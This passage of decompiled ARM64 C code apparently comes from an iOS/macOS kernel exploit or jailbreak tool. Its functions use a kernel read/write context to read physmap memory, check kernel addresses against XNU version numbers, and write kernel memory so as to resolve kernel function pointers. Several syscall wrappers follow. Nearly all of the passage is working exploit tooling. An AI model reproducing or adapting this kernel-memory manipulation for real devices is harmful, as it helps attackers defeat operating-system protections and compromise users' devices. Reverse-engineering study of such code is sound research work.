      goto LABEL_50;
  }
  v29 = v34 + (v31 - 1) * krwCtx->stride_0x168;
LABEL_53:
  if ( kwritebuf_last_0(krwCtx, v29, &v32, 4u) )
  {
    v14 = 0;
    goto LABEL_56;
  }
LABEL_55:
  v14 = 163856;
LABEL_56:
  if ( v36 != -1 )
    fd_close(v36);
  return v14;
}

//----- (0000000000040CBC) ----------------------------------------------------
__int64 __fastcall resolve_kfunc_via_page_dispatch(
        struct_krwCtx *krwCtx,
        __int64 a2,
        unsigned int a3,
        __int64 *a4,
        __int64 (__fastcall *a5)(__int64, __int64),
        __int64 a6)
{
  __int64 v11; // x25
  __int64 v12; // x8
  __int64 v13; // x23
  int v14; // w0
  int v15; // w23
  unsigned int v16; // w28
  int v17; // w26
  unsigned int v18; // w8
  __int64 v19; // x0
  __int64 v20; // x27
  __int64 v21; // x10
  unsigned __int16 v22; // w8
  unsigned int v23; // w9
  unsigned int v25; // [xsp+Ch] [xbp-74h] BYREF
  __int64 v26; // [xsp+10h] [xbp-70h] BYREF
  __int64 v27; // [xsp+18h] [xbp-68h] BYREF
  unsigned __int64 v28; // [xsp+20h] [xbp-60h] BYREF
  unsigned int v29; // [xsp+28h] [xbp-58h] BYREF
  int v30; // [xsp+2Ch] [xbp-54h] BYREF

  v11 = 163855;
  v30 = -1;
  v28 = 0;
  v12 = 32;
  if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
    v12 = 40;
  if ( !kread_physmap_decorated(krwCtx, v12 + a2, (unsigned __int64 *)&v27) )
  {
    v13 = 163855;
    goto LABEL_32;
  }
  if ( !validate_kaddr_range(krwCtx, v27) )
  {
    v13 = 163878;
    goto LABEL_32;
  }
  v13 = fd_open_dev_null(&v30);
  if ( (uint32_t)v13 )
    goto LABEL_32;
  v14 = get_page_size();
  if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
  {
    v13 = 708616;
    goto LABEL_32;
  }
  if ( !kreadbuf_last_0(krwCtx, v27 + (unsigned int)(krwCtx->pageSizeOrSomething * v14) + 8, krwCtx->stride_0x168, &v28) )
    goto LABEL_31;
  if ( !validate_kaddr_range(krwCtx, v28) )
  {
    v11 = 163878;
    goto LABEL_31;
  }
  v15 = get_page_size();
  if ( !kreadbuf_last_0(krwCtx, v27 + (unsigned int)(krwCtx->pageSizeOrSomething * v15), 4u, &v25) )
  {
LABEL_31:
    v13 = v11;
    goto LABEL_32;
  }
  while ( 1 )
  {
    v16 = v25;
    v17 = (unsigned __int16)v25;
    v18 = (unsigned __int16)v25;
    if ( !(uint16_t)v25 )
    {
      if ( v25 < 0x10000 )
      {
        if ( a5 )
        {
          v19 = a5(krwCtx, a6);
          if ( (uint32_t)v19 )
          {
            v11 = v19;
            goto LABEL_31;
          }
        }
        goto LABEL_25;
      }
      v18 = HIWORD(v25);
    }
    v20 = v18 - 1LL;
    if ( (unsigned int)v20 > 7 )
    {
      v11 = 163857;
      goto LABEL_31;
    }
    v21 = 8;
    if ( !(uint16_t)v25 )
      v21 = 16;
    if ( !kreadbuf_last_0(krwCtx, v27 + v21 + (unsigned int)(krwCtx->pageSizeOrSomething * v15), 4u, &v29) )
      goto LABEL_31;
    v28 = v29 | ((unsigned __int64)HIDWORD(v28) << 32);
    v26 = 0;
    if ( !kreadbuf_last_0(krwCtx, v28 + krwCtx->stride_0x168 * v20, krwCtx->stride_0x168, &v26) )
      goto LABEL_31;
    if ( validate_kaddr_range(krwCtx, v26 & ~krwCtx->pageMask) )
    {
      v26 = (v26 & ~krwCtx->pageMask) + (krwCtx->pageMask & v26) * a3;
      v22 = v16 - 1;
      v23 = v16 & 0xFFFF0000;
      if ( !v17 )
      {
        v22 = v16;
        v23 = (v16 & 0xFFFF0000) - 0x10000;
      }
      v25 = (v23 & 0xFFFF0000) | v22;
      if ( (unsigned int)get_page_size() == v15 )
        break;
    }
LABEL_25:
    v15 = get_page_size();
    if ( !kreadbuf_last_0(krwCtx, v27 + (unsigned int)(krwCtx->pageSizeOrSomething * v15), 4u, &v25) )
      goto LABEL_31;
  }
  if ( !kwritebuf_last_0(krwCtx, v27 + (unsigned int)(krwCtx->pageSizeOrSomething * v15), &v25, 4u) )
  {
    v11 = 163856;
    goto LABEL_31;
  }
  v13 = 0;
  *a4 = v26;
LABEL_32:
  if ( v30 != -1 )
    fd_close(v30);
  return v13;
}

////----- (0000000000040FB0) ----------------------------------------------------
//__int64 __fastcall __mac_syscall(__int64 a1, __int64 a2, __int64 a3)
//{
//  return syscall(SYS___mac_syscall, a1, a2, a3);
//}
//
////----- (0000000000040FDC) ----------------------------------------------------
//__int64 __fastcall getattrlistbulk(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
//{
//  return syscall(SYS_getattrlistbulk, a1, a2, a3, a4, a5);
//}
//
////----- (000000000004100C) ----------------------------------------------------
__int64 __fastcall fs_snapshot(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  return syscall(SYS_fs_snapshot, a1, a2, a3, a4, a5, a6);
}
